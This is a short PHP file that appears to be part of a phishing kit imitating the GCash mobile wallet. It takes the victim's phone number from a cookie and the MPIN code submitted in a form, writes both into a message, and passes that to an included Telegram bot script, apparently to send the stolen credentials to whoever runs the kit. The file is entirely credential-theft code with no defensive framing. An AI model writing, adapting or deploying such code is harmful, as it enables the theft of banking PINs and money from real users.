<?php

include('system.php');

if ($_POST["mpincode"]) {.
    $gcash_number = base64_encode(base64_encode($_COOKIE["number"]));
    $from = base64_decode(base64_decode($gcash_number));
    $mpincode = $_POST['mpincode'];
    $replyMsg = "\n FROM => $from\n MPIN_F ►$mpincode";
    include('Gcash_files/tele_bot.php');
 
    http_response_code(200);
    setcookie("gcash_number", "$gcash_number", time()-3600);

}

?>